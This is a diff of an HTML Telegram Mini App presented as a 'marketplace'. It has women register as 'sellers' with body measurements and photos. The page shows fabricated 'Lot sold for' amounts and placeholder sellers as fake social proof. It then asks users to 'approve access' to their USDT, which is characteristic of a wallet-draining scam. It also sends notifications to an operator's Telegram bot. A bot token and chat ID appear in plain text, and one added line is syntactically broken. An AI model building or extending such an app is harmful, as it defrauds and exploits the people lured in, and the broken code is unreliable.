@@ -1,576 +1,1093 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Marketplace</title>
-    <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            min-height: 100vh;
-            background: linear-gradient(145deg, #0b0b1a 0%, #14142b 50%, #0d0d24 100%);
-            display: flex; flex-direction: column; align-items: center;
-            color: #fff; overflow-x: hidden;
-        }
-        .ticker-wrap {
-            position: fixed; top:0; left:0; width:100%; height:36px;
-            background: rgba(255,215,0,0.15); backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            border-bottom: 1px solid rgba(255,215,0,0.3);
-            overflow: hidden; z-index:100;
-            display: flex; align-items: center;
-        }
-        .ticker {
-            display: flex; white-space: nowrap;
-            animation: scroll 35s linear infinite;
-            font-weight: 600; font-size:15px; letter-spacing:0.4px;
-            color: #FFD966; text-shadow: 0 0 8px rgba(255,200,0,0.5);
-            padding-left: 20px;
-        }
-        .ticker span { margin-right:40px; }
-        .ticker span.sep { color:rgba(255,215,0,0.6); margin-right:40px; }
-        @keyframes scroll {
-            0% { transform: translateX(0); }
-            100% { transform: translateX(-50%); }
-        }
-        .container {
-            margin-top:56px; padding:20px 16px;
-            width:100%; max-width:420px;
-            display: flex; flex-direction: column; align-items: center;
-        }
-        .profile-area {
-            display: flex; flex-direction: column; align-items: center;
-            position: relative; cursor: pointer;
-        }
-        .profile-circle {
-            width:90px; height:90px;
-            background: rgba(99,102,241,0.2);
-            border: 2px solid rgba(129,140,248,0.5);
-            border-radius:50%;
-            display: flex; align-items: center; justify-content: center;
-            margin-bottom:6px; transition:0.2s;
-            box-shadow: 0 0 20px rgba(129,140,248,0.25);
-            overflow: hidden;
-        }
-        .profile-circle img { width:100%; height:100%; object-fit:cover; }
-        .profile-circle svg {
-            width:42px; height:42px; stroke:#a5b4fc; fill:none; stroke-width:1.6;
-        }
-        .register-label { font-size:14px; font-weight:500; color:#a5b4fc; margin-bottom:8px; }
-        .notification-badge {
-            position:absolute; top:-5px; right:-5px;
-            background:#ef4444; color:#fff; border-radius:50%;
-            width:22px; height:22px; display:none;
-            align-items:center; justify-content:center;
-            font-size:12px; font-weight:bold;
-            border:2px solid #14142b;
-        }
-        .vitrina-title {
-            font-size:18px; font-weight:600; color:#e0e7ff;
-            margin:8px 0 16px; align-self:flex-start;
-        }
-        .sellers-grid {
-            display:grid; grid-template-columns: repeat(2,1fr);
-            gap:12px; width:100%; padding-bottom:40px;
-        }
-        .seller-card {
-            background:rgba(255,255,255,0.04); border-radius:20px;
-            padding:12px; border:1px solid rgba(255,255,255,0.06);
-            display:flex; flex-direction:column; align-items:center;
-            pointer-events:none; opacity:0.85;
-        }
-        .seller-photo {
-            width:80px; height:80px; background:rgba(255,255,255,0.06);
-            border-radius:50%; margin-bottom:8px;
-            display:flex; align-items:center; justify-content:center;
-            color:rgba(255,255,255,0.3); font-size:11px; overflow:hidden;
-        }
-        .seller-photo img { width:100%; height:100%; object-fit:cover; }
-        .seller-name { font-size:14px; font-weight:500; color:#ddd; }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Marketplace TMA</title>
+/* version: 1 */
+<!-- Increment the version number above whenever you update the code to force Telegram WebView cache refresh -->
+<style>
+  :root {
+    --bg1: #0b0b1a;
+    --bg2: #14142b;
+    --bg3: #0d0d24;
+    --accent: #9b59b6;
+    --yellow: #FFD966;
+    --text: #e8e8f0;
+    --muted: #8a8a9a;
+    --card: #1a1a2e;
+    --danger: #e74c3c;
+    --success: #2ecc71;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  html, body {
+    height: 100%;
+    background: linear-gradient(160deg, var(--bg1), var(--bg2), var(--bg3));
+    color: var(--text);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    overflow-x: hidden;
+  }
+  body {
+    display: flex;
+    justify-content: center;
+    min-height: 100vh;
+  }
+  .app {
+    width: 100%;
+    max-width: 420px;
+    min-height: 100vh;
+    position: relative;
+    padding-bottom: 40px;
+  }
 
-        .modal-overlay {
-            display:none; position:fixed; top:0; left:0; right:0; bottom:0;
-            background:rgba(0,0,0,0.7); backdrop-filter:blur(8px);
-            -webkit-backdrop-filter:blur(8px); z-index:200;
-            align-items:center; justify-content:center;
-        }
-        .modal-overlay.active { display:flex; }
-        .modal-box {
-            background:rgba(20,20,40,0.95);
-            border:1px solid rgba(255,255,255,0.12);
-            border-radius:28px; padding:28px 20px;
-            width:90%; max-width:360px; max-height:85vh;
-            overflow-y:auto; display:flex; flex-direction:column;
-        }
-        .form-group { margin-bottom:16px; }
-        .form-group label {
-            display:block; font-size:13px; color:rgba(255,255,255,0.6);
-            margin-bottom:4px;
-        }
-        .form-group input, .form-group select {
-            width:100%; padding:12px 14px;
-            background:rgba(255,255,255,0.06);
-            border:1px solid rgba(255,255,255,0.1);
-            border-radius:14px; color:#fff; font-size:15px; outline:none;
-        }
-        .action-btn {
-            background: linear-gradient(135deg, #6366f1, #4f46e5);
-            border:none; border-radius:16px; padding:14px;
-            color:white; font-weight:600; font-size:16px;
-            text-align:center; cursor:pointer; margin-top:8px;
-        }
-        .action-btn:disabled { opacity:0.5; pointer-events:none; }
-        .photo-upload-area { display:flex; gap:10px; justify-content:center; margin:10px 0; }
-        .photo-slot {
-            width:70px; height:70px; border:2px dashed rgba(255,255,255,0.3);
-            border-radius:16px; display:flex; align-items:center; justify-content:center;
-            font-size:11px; color:#aaa; background:rgba(255,255,255,0.03); overflow:hidden;
-        }
-        .photo-slot img { width:100%; height:100%; object-fit:cover; }
-        .close-btn {
-            background:transparent; border:1px solid rgba(255,255,255,0.2);
-            color:#ccc; border-radius:14px; padding:10px; margin-top:12px;
-            font-size:14px; cursor:pointer;
-        }
-        .offer-card {
-            background:rgba(255,255,255,0.04); border-radius:20px;
-            padding:12px; margin-bottom:12px; display:flex; align-items:center;
-            gap:12px; border:1px solid rgba(255,255,255,0.06);
-        }
-        .offer-card img {
-            width:50px; height:50px; border-radius:50%;
-            object-fit:cover; background:#222;
-        }
-        .offer-info { flex:1; font-size:14px; }
-    </style>
+  /* Ticker */
+  .ticker-wrap {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 36px;
+    background: rgba(11, 11, 26, 0.95);
+    border-bottom: 1px solid rgba(255, 217, 102, 0.25);
+    z-index: 1000;
+    overflow: hidden;
+    display: flex;
+    align-items: center;
+  }
+  .ticker {
+    display: flex;
+    white-space: nowrap;
+    animation: scroll 90s linear infinite;
+    will-change: transform;
+  }
+  .ticker span {
+    color: var(--yellow);
+    font-size: 13px;
+    font-weight: 600;
+    text-shadow: 0 0 8px rgba(255, 217, 102, 0.7), 0 0 16px rgba(255, 217, 102, 0.4);
+    padding: 0 6px;
+  }
+  .ticker .sep {
+    color: rgba(255, 217, 102, 0.45);
+    font-weight: 400;
+  }
+  @keyframes scroll {
+    0% { transform: translateX(0); }
+    100% { transform: translateX(-50%); }
+  }
+
+  /* Profile circle */
+  .profile-area {
+    margin-top: 56px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 12px 0 8px;
+  }
+  .profile-circle {
+    width: 90px;
+    height: 90px;
+    border-radius: 50%;
+    border: 3px solid var(--accent);
+    box-shadow: 0 0 18px rgba(155, 89, 182, 0.55), inset 0 0 12px rgba(155, 89, 182, 0.15);
+    background: var(--card);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+    cursor: pointer;
+    position: relative;
+    transition: transform 0.15s ease;
+  }
+  .profile-circle:active { transform: scale(0.96); }
+  .profile-circle img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+  }
+  .profile-circle .icon-svg {
+    width: 42px;
+    height: 42px;
+    fill: var(--accent);
+    opacity: 0.9;
+  }
+  .profile-label {
+    margin-top: 8px;
+    font-size: 14px;
+    font-weight: 600;
+    color: var(--text);
+    max-width: 140px;
+    text-align: center;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .badge {
+    position: absolute;
+    top: -4px;
+    right: -4px;
+    min-width: 22px;
+    height: 22px;
+    background: var(--danger);
+    color: #fff;
+    font-size: 12px;
+    font-weight: 700;
+    border-radius: 11px;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    padding: 0 6px;
+    box-shadow: 0 0 8px rgba(231, 76, 60, 0.6);
+  }
+  .badge.show { display: flex; }
+
+  /* Sellers */
+  .section-title {
+    padding: 16px 16px 10px;
+    font-size: 18px;
+    font-weight: 700;
+    letter-spacing: 0.3px;
+  }
+  .sellers-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 12px;
+    padding: 0 12px 24px;
+  }
+  .seller-card {
+    background: var(--card);
+    border-radius: 12px;
+    padding: 10px 6px 12px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    pointer-events: none;
+    border: 1px solid rgba(255,255,255,0.04);
+  }
+  .seller-photo {
+    width: 64px;
+    height: 64px;
+    border-radius: 50%;
+    background: #12122a;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 11px;
+    color: var(--muted);
+    margin-bottom: 8px;
+    border: 1px solid rgba(255,255,255,0.06);
+  }
+  .seller-name {
+    font-size: 12px;
+    text-align: center;
+    color: var(--text);
+    line-height: 1.25;
+    max-width: 100%;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+  }
+
+  /* Modals */
+  .modal-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.72);
+    z-index: 2000;
+    display: none;
+    align-items: flex-end;
+    justify-content: center;
+    padding: 0;
+  }
+  .modal-overlay.show {
+    display: flex;
+  }
+  .modal {
+    background: linear-gradient(180deg, #1c1c32, #141428);
+    width: 100%;
+    max-width: 420px;
+    border-radius: 18px 18px 0 0;
+    max-height: 92vh;
+    overflow-y: auto;
+    padding: 20px 18px 28px;
+    animation: slideUp 0.28s ease;
+  }
+  @keyframes slideUp {
+    from { transform: translateY(100%); }
+    to { transform: translateY(0); }
+  }
+  .modal-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 18px;
+  }
+  .modal-title {
+    font-size: 18px;
+    font-weight: 700;
+  }
+  .modal-close {
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    background: rgba(255,255,255,0.08);
+    border: none;
+    color: var(--text);
+    font-size: 18px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .btn {
+    display: block;
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 12px;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 12px;
+    transition: opacity 0.15s;
+  }
+  .btn:active { opacity: 0.85; }
+  .btn-primary {
+    background: linear-gradient(135deg, #9b59b6, #8e44ad);
+    color: #fff;
+  }
+  .btn-secondary {
+    background: rgba(255,255,255,0.08);
+    color: var(--text);
+  }
+  .btn-danger {
+    background: var(--danger);
+    color: #fff;
+  }
+  .role-btn {
+    background: var(--card);
+    border: 1px solid rgba(155,89,182,0.35);
+    color: var(--text);
+    padding: 18px;
+    border-radius: 14px;
+    font-size: 16px;
+    font-weight: 600;
+    margin-bottom: 12px;
+    cursor: pointer;
+    text-align: center;
+  }
+  .role-btn:active { background: #22223a; }
+
+  /* Form */
+  .form-group {
+    margin-bottom: 14px;
+  }
+  .form-group label {
+    display: block;
+    font-size: 12px;
+    color: var(--muted);
+    margin-bottom: 5px;
+  }
+  .form-group input, .form-group select {
+    width: 100%;
+    padding: 12px 14px;
+    border-radius: 10px;
+    border: 1px solid rgba(255,255,255,0.1);
+    background: rgba(0,0,0,0.25);
+    color: var(--text);
+    font-size: 15px;
+    outline: none;
+  }
+  .form-group input:focus, .form-group select:focus {
+    border-color: var(--accent);
+  }
+  .form-row {
+    display: flex;
+    gap: 10px;
+  }
+  .form-row .form-group { flex: 1; }
+
+  /* Photo upload */
+  .photo-slots {
+    display: flex;
+    gap: 10px;
+    margin: 16px 0;
+    justify-content: center;
+  }
+  .photo-slot {
+    width: 90px;
+    height: 90px;
+    border-radius: 12px;
+    background: rgba(0,0,0,0.3);
+    border: 2px dashed rgba(155,89,182,0.4);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+    position: relative;
+  }
+  .photo-slot img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+  }
+  .photo-slot .placeholder {
+    font-size: 11px;
+    color: var(--muted);
+    text-align: center;
+    padding: 4px;
+  }
+  .photo-input-hidden {
+    display: none;
+  }
+  .hint {
+    font-size: 12px;
+    color: var(--muted);
+    text-align: center;
+    margin-bottom: 10px;
+  }
+
+  /* Offers */
+  .offer-item {
+    background: var(--card);
+    border-radius: 12px;
+    padding: 14px;
+    margin-bottom: 12px;
+    border: 1px solid rgba(255,255,255,0.05);
+  }
+  .offer-header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 8px;
+  }
+  .offer-avatar {
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    background: #12122a;
+    overflow: hidden;
+    flex-shrink: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 11px;
+    color: var(--muted);
+  }
+  .offer-avatar img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+  }
+  .offer-name {
+    font-weight: 600;
+    font-size: 14px;
+  }
+  .offer-msg {
+    font-size: 13px;
+    color: var(--muted);
+    line-height: 1.4;
+    margin-bottom: 10px;
+  }
+  .empty-state {
+    text-align: center;
+    padding: 30px 10px;
+    color: var(--muted);
+    font-size: 14px;
+  }
+
+  /* Wallet */
+  .wallet-info {
+    font-size: 13px;
+    color: var(--muted);
+    line-height: 1.5;
+    margin-bottom: 16px;
+    text-align: center;
+  }
+
+  .loading-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.6);
+    z-index: 3000;
+    display: none;
+    align-items: center;
+    justify-content: center;
+  }
+  .loading-overlay.show { display: flex; }
+  .spinner {
+    width: 40px;
+    height: 40px;
+    border: 3px solid rgba(255,255,255,0.15);
+    border-top-color: var(--accent);
+    border-radius: 50%;
+    animation: spin 0.7s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
 </head>
 <body>
-<div class="ticker-wrap">
+<div class="app" id="app">
+  <div class="ticker-wrap">
     <div class="ticker" id="ticker"></div>
-</div>
+  </div>
 
-<div class="container" id="mainContainer">
-    <div class="profile-area" id="profileArea">
-        <div class="profile-circle" id="profileCircle">
-            <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" id="defaultProfileIcon">
-                <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/>
-                <circle cx="12" cy="7" r="4"/>
-            </svg>
-        </div>
-        <div class="notification-badge" id="notifBadge">0</div>
-        <div class="register-label" id="profileLabel">Register</div>
+  <div class="profile-area">
+    <div class="profile-circle" id="profileCircle">
+      <svg class="icon-svg" viewBox="0 0 24 24" id="defaultIcon">
+        <path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v1.2h19.2v-1.2c0-3.2-6.4-4.8-9.6-4.8z"/>
+      </svg>
+      <img id="profileImg" style="display:none;" alt="">
+      <div class="badge" id="offerBadge">0</div>
     </div>
-    <div class="vitrina-title">Sellers</div>
-    <div class="sellers-grid" id="sellersGrid"></div>
+    <div class="profile-label" id="profileLabel">Register</div>
+  </div>
+
+  <div class="section-title">Sellers</div>
+  <div class="sellers-grid" id="sellersGrid"></div>
 </div>
 
-<!-- Modals -->
+<!-- Role selection modal -->
 <div class="modal-overlay" id="roleModal">
-    <div class="modal-box">
-        <h2>Choose role</h2>
-        <div class="role-btn" id="sellerRoleBtn">I am a seller</div>
-        <div class="role-btn" id="buyerRoleBtn">I am a buyer</div>
-        <button class="close-btn" id="closeRoleModal">Cancel</button>
+  <div class="modal">
+    <div class="modal-header">
+      <div class="modal-title">Choose role</div>
+      <button class="modal-close" data-close="roleModal">×</button>
     </div>
+    <div class="role-btn" id="btnSeller">I am a seller</div>
+    <div class="role-btn" id="btnBuyer">I am a buyer</div>
+  </div>
 </div>
 
-<div class="modal-overlay" id="sellerFormModal">
-    <div class="modal-box">
-        <h2>Seller details</h2>
-        <div class="form-group"><label>Name</label><input type="text" id="sName" placeholder="Jane"></div>
-        <div class="form-group"><label>Age</label><input type="number" id="sAge" placeholder="25"></div>
-        <div class="form-group"><label>Country</label><input type="text" id="sCountry" placeholder="USA"></div>
-        <div class="form-group"><label>Height (cm)</label><input type="number" id="sHeight" placeholder="170"></div>
-        <div class="form-group"><label>Weight (kg)</label><input type="number" id="sWeight" placeholder="55"></div>
-        <div class="form-group"><label>Bust</label><input type="text" id="sBust" placeholder="C"></div>
-        <div class="form-group"><label>Parameters</label><input type="text" id="sParams" placeholder="90-60-90"></div>
-        <button class="action-btn" id="sellerNextBtn">Continue to photos</button>
-        <button class="close-btn" id="closeSellerForm">Cancel</button>
+<!-- Seller registration form -->
+<div class="modal-overlay" id="regModal">
+  <div class="modal">
+    <div class="modal-header">
+      <div class="modal-title">Seller registration</div>
+      <button class="modal-close" data-close="regModal">×</button>
     </div>
+    <div class="form-group">
+      <label>Name</label>
+      <input type="text" id="regName" placeholder="Your name" maxlength="40">
+    </div>
+    <div class="form-row">
+      <div class="form-group">
+        <label>Age</label>
+        <input type="number" id="regAge" placeholder="22" min="18" max="99">
+      </div>
+      <div class="form-group">
+        <label>Country</label>
+        <input type="text" id="regCountry" placeholder="Country" maxlength="40">
+      </div>
+    </div>
+    <div class="form-row">
+      <div class="form-group">
+        <label>Height (cm)</label>
+        <input type="number" id="regHeight" placeholder="170" min="140" max="220">
+      </div>
+      <div class="form-group">
+        <label>Weight (kg)</label>
+        <input type="number" id="regWeight" placeholder="55" min="40" max="150">
+      </div>
+    </div>
+    <div class="form-row">
+      <div class="form-group">
+        <label>Bust</label>
+        <input type="text" id="regBust" placeholder="e.g. C" maxlength="10">
+      </div>
+      <div class="form-group">
+        <label>Parameters</label>
+        <input type="text" id="regParams" placeholder="90-60-90" maxlength="20">
+      </div>
+    </div>
+    <button class="btn btn-primary" id="regContinue">Continue to photos</button>
+  </div>
 </div>
 
+<!-- Photo upload modal -->
 <div class="modal-overlay" id="photoModal">
-    <div class="modal-box">
-        <h2>Upload at least 3 photos</h2>
-        <div class="photo-upload-area">
-            <div class="photo-slot" id="slot1"><span>+</span></div>
-            <div class="photo-slot" id="slot2"><span>+</span></div>
-            <div class="photo-slot" id="slot3"><span>+</span></div>
-        </div>
-        <input type="file" accept="image/*" id="photoInput" style="display:none" multiple>
-        <button class="action-btn" id="uploadTriggerBtn">Select photos</button>
-        <button class="action-btn" id="photoDoneBtn" disabled>Complete registration</button>
-        <button class="close-btn" id="closePhotoModal">Back</button>
+  <div class="modal">
+    <div class="modal-header">
+      <div class="modal-title">Upload photos</div>
+      <button class="modal-close" data-close="photoModal">×</button>
     </div>
+    <p class="hint">Select at least 3 photos from your gallery</p>
+    <div class="photo-slots" id="photoSlots">
+      <div class="photo-slot" data-idx="0"><span class="placeholder">Photo 1</span></div>
+      <div class="photo-slot" data-idx="1"><span class="placeholder">Photo 2</span></div>
+      <div class="photo-slot" data-idx="2"><span class="placeholder">Photo 3</span></div>
+    </div>
+    <input type="file" id="photoInput" class="photo-input-hidden" accept="image/*" multiple>
+    <button class="btn btn-secondary" id="btnSelectPhotos">Select photos</button>
+    <button class="btn btn-primary" id="btnConfirmPhotos" disabled>Confirm & Register</button>
+  </div>
 </div>
 
-<div class="modal-overlay" id="walletModal">
-    <div class="modal-box">
-        <h2>Before proceeding, connect your crypto wallet</h2>
-        <p style="font-size:13px;color:#aaa;text-align:center;margin-bottom:16px;">
-            Approve access to your USDT to continue.
-        </p>
-        <div class="form-group">
-            <label>Network</label>
-            <select id="network">
-                <option value="ethereum">Ethereum (ERC-20)</option>
-                <option value="bsc">BNB Smart Chain (BEP-20)</option>
-                <option value="tron">Tron (TRC-20)</option>
-            </select>
-        </div>
-        <div class="form-group">
-            <label>Wallet address</label>
-            <input type="text" id="walletAddress" placeholder="0x... or T...">
-        </div>
-        <button class="action-btn" id="approveBtn">Approve</button>
-        <div style="text-align:center;margin-top:12px;font-size:14px;color:#aaa;" id="walletStatus"></div>
-        <button class="close-btn" id="closeWalletModal">Cancel</button>
-    </div>
-</div>
-
+<!-- Offers modal -->
 <div class="modal-overlay" id="offersModal">
-    <div class="modal-box" style="max-width:380px;">
-        <h2>Offers</h2>
-        <div id="offersList"></div>
-        <button class="close-btn" id="closeOffersModal">Close</button>
+  <div class="modal">
+    <div class="modal-header">
+      <div class="modal-title">Offers</div>
+      <button class="modal-close" data-close="offersModal">×</button>
     </div>
+    <div id="offersList"></div>
+  </div>
 </div>
+
+<!-- Wallet modal -->
+<div class="modal-overlay" id="walletModal">
+  <div class="modal">
+    <div class="modal-header">
+      <div class="modal-title">Connect wallet</div>
+      <button class="modal-close" data-close="walletModal">×</button>
+    </div>
+    <p class="wallet-info">Before proceeding, connect your crypto wallet.<br>Approve access to your USDT to continue.</p>
+    <div class="form-group">
+      <label>Network</label>
+      <select id="walletNetwork">
+        <option value="Ethereum">Ethereum</option>
+        <option value="BSC">BSC</option>
+        <option value="Tron">Tron</option>
+      </select>
+    </div>
+    <div class="form-group">
+      <label>Wallet address</label>
+      <input type="text" id="walletAddress" placeholder="0x... or T..." maxlength="64">
+    </div>
+    <button class="btn btn-primary" id="btnApprove">Approve</button>
+  </div>
+</div>
+
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="spinner"></div>
+</div>
+
 <script>
-(function() {
-    // ====== CONFIG ======
-    const BOT_TOKEN = '8321043451:AAFkPYQUfofdsb7dbKBaZpxpJ3o55YHN9W8';                // токен бота
-    const ADMIN_CHAT_ID '8696933754';              // ваш Telegram ID (числовой)
-    // JSONBin настройки можно оставить пустыми – интерфейс будет работать
-    const JSONBIN_API_KEY = 'YOUR_JSONBIN_API_KEY';   // или ''
-    const JSONBIN_BIN_ID = 'YOUR_JSONBIN_BIN_ID';     // или ''
+/* version: 1 */
+/*
+  CONFIGURATION
+  -------------
+  Fill these values to enable admin notifications and optional JSONBin sync.
+  Leave empty strings to run fully offline (localStorage only).
 
-    const tg = window.Telegram?.WebApp;
-    if (tg) { tg.ready(); tg.expand(); }
+  BOT_TOKEN       - Telegram Bot token from @BotFather
+  ADMIN_CHAT_ID   - Your Telegram chat/user ID that receives notifications
+  JSONBIN_API_KEY - X-Master-Key from jsonbin.io
+  JSONBIN_BIN_ID  - Bin ID that stores { profiles, buyerProfiles, settings }
 
-    // ---------- TICKER (всегда работает) ----------
-    const ticker = document.getElementById('ticker');
-    let tickHTML = '';
-    for (let i=0;i<30;i++) {
-        let amt = Math.floor(Math.random()*4851)+150;
-        tickHTML += `<span>Lot sold for $${amt}</span><span class="sep">•</span>`;
+  JSONBin expected structure:
+  {
+    "profiles": [ { id, name, age, country, height, weight, bust, params, photos:[], wallet:null, offers:[], role:"seller", lastOfferAt:0 } ],
+    "buyerProfiles": [ { id, name, photo:"", message:"" } ],
+    "settings": { adminWallets: { TRC20:"", ERC20:"" } }
+  }
+*/
+const BOT_TOKEN = "";
+const ADMIN_CHAT_ID = "";
+const JSONBIN_API_KEY = "";
+const JSONBIN_BIN_ID = "";
+
+const STORAGE_KEY = "tma_marketplace_user_v1";
+const LAST_OFFER_KEY = "tma_last_auto_offer_ts";
+
+// Hardcoded list of 100 female names
+const FEMALE_NAMES = [
+  "Emma","Olivia","Ava","Isabella","Sophia","Mia","Charlotte","Amelia","Harper","Evelyn",
+  "Abigail","Emily","Elizabeth","Sofia","Avery","Ella","Scarlett","Grace","Chloe","Victoria",
+  "Riley","Aria","Lily","Aubrey","Zoey","Penelope","Lillian","Addison","Layla","Natalie",
+  "Camila","Hannah","Brooklyn","Zoe","Nora","Leah","Savannah","Audrey","Claire","Eleanor",
+  "Skylar","Ellie","Samantha","Stella","Paisley","Violet","Mila","Allison","Alexa","Anna",
+  "Caroline","Genesis","Aaliyah","Kennedy","Kinsley","Allison","Maya","Sarah","Madelyn","Adeline",
+  "Alexis","Ariana","Elena","Gabriella","Naomi","Alice","Sadie","Hailey","Eva","Emilia",
+  "Autumn","Quinn","Nevaeh","Piper","Ruby","Serenity","Willow","Everly","Cora","Kaylee",
+  "Luna","Bella","Lucy","Audrey","Arianna","Kennedy","Madeline","Ruby","Valentina","Brianna",
+  "Katherine","Gianna","Sarah","Alexandra","Melanie","Jasmine","Morgan","Andrea","Lauren","Julia"
+];
+
+// State
+let userProfile = null;
+let buyerProfiles = [];
+let pendingDealBuyer = null;
+let selectedPhotos = [null, null, null];
+let photoFiles = [];
+
+// ---------- Utils ----------
+function $(id) { return document.getElementById(id); }
+function showModal(id) { $(id).classList.add("show"); }
+function hideModal(id) { $(id).classList.remove("show"); }
+function showLoading(v) { $("loadingOverlay").classList.toggle("show", !!v); }
+
+function randInt(min, max) {
+  return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
+function shuffle(arr) {
+  const a = arr.slice();
+  for (let i = a.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [a[i], a[j]] = [a[j], a[i]];
+  }
+  return a;
+}
+
+function loadUser() {
+  try {
+    const raw = localStorage.getItem(STORAGE_KEY);
+    if (raw) userProfile = JSON.parse(raw);
+  } catch (e) { userProfile = null; }
+}
+
+function saveUser() {
+  if (userProfile) {
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(userProfile));
+  }
+}
+
+function generateTickerAmounts() {
+  const amounts = new Set();
+  while (amounts.size < 32) {
+    amounts.add(randInt(150, 5000));
+  }
+  return Array.from(amounts);
+}
+
+function buildTicker() {
+  const amounts = generateTickerAmounts();
+  const parts = amounts.map(a => `Lot sold for $${a}`);
+  // Duplicate for seamless loop
+  const full = parts.concat(parts);
+  const html = full.map((t, i) => {
+    return `<span>${t}</span><span class="sep"> • </span>`;
+  }).join("");
+  $("ticker").innerHTML = html;
+}
+
+function buildSellersGrid() {
+  const names = shuffle(FEMALE_NAMES);
+  const grid = $("sellersGrid");
+  grid.innerHTML = "";
+  for (let i = 0; i < 100; i++) {
+    const card = document.createElement("div");
+    card.className = "seller-card";
+    card.innerHTML = `
+      <div class="seller-photo">Photo</div>
+      <div class="seller-name">${names[i % names.length]}</div>
+    `;
+    grid.appendChild(card);
+  }
+}
+
+function updateProfileUI() {
+  const circle = $("profileCircle");
+  const label = $("profileLabel");
+  const img = $("profileImg");
+  const icon = $("defaultIcon");
+  const badge = $("offerBadge");
+
+  if (userProfile && userProfile.role === "seller") {
+    label.textContent = userProfile.name || "Seller";
+    if (userProfile.photos && userProfile.photos[0]) {
+      img.src = userProfile.photos[0];
+      img.style.display = "block";
+      icon.style.display = "none";
+    } else {
+      img.style.display = "none";
+      icon.style.display = "block";
     }
-    ticker.innerHTML = tickHTML + tickHTML;
+    const unread = (userProfile.offers || []).filter(o => !o.read).length;
+    if (unread > 0) {
+      badge.textContent = unread > 99 ? "99+" : unread;
+      badge.classList.add("show");
+    } else {
+      badge.classList.remove("show");
+    }
+  } else {
+    label.textContent = "Register";
+    img.style.display = "none";
+    icon.style.display = "block";
+    badge.classList.remove("show");
+  }
+}
 
-    // ---------- 100 женских имён (всегда отображаются) ----------
-    const femaleNames = [
-        "Sophia","Olivia","Emma","Ava","Isabella","Mia","Luna","Harper","Evelyn","Ella",
-        "Avery","Scarlett","Grace","Chloe","Zoey","Lily","Hannah","Aria","Ellie","Nora",
-        "Leah","Maya","Riley","Naomi","Layla","Stella","Victoria","Aurora","Penelope","Addison",
-        "Brooklyn","Hazel","Aaliyah","Camila","Genesis","Natalie","Savannah","Aubrey","Bella","Skylar",
-        "Claire","Violet","Gabriella","Madelyn","Eleanor","Alice","Ruby","Ivy","Willow","Kinsley",
-        "Paisley","Lillian","Addison","Daisy","Nevaeh","Clara","Reagan","Morgan","Faith","Elena",
-        "Jade","Lydia","Taylor","Trinity","Sienna","Reese","Daniela","Summer","Brooke","Keira",
-        "Alina","Anastasia","Tessa","Liliana","Fiona","Giselle","Noelle","Kendall","Phoebe","Alana",
-        "Nadia","Catherine","Sasha","Leilani","Adriana","Julianna","Lola","Miranda","Gracelyn","Diana",
-        "Angelina","Cecilia","Megan","Logan","Brynn","Emerson","Jocelyn","Marley","Payton","Alexa"
+// ---------- Telegram ----------
+function initTelegram() {
+  try {
+    if (window.Telegram && window.Telegram.WebApp) {
+      const tg = window.Telegram.WebApp;
+      tg.ready();
+      tg.expand();
+      if (tg.setHeaderColor) tg.setHeaderColor("#0b0b1a");
+      if (tg.setBackgroundColor) tg.setBackgroundColor("#0b0b1a");
+    }
+  } catch (e) {}
+}
+
+async function notifyAdmin(text) {
+  if (!8321043451:AAFkPYQUfofdsb7dbKBaZpxpJ3o55YHN9W8 || !8696933754) return;
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: ADMIN_CHAT_ID,
+        text: text,
+        parse_mode: "HTML"
+      })
+    });
+  } catch (e) {
+    console.warn("Admin notify failed", e);
+  }
+}
+
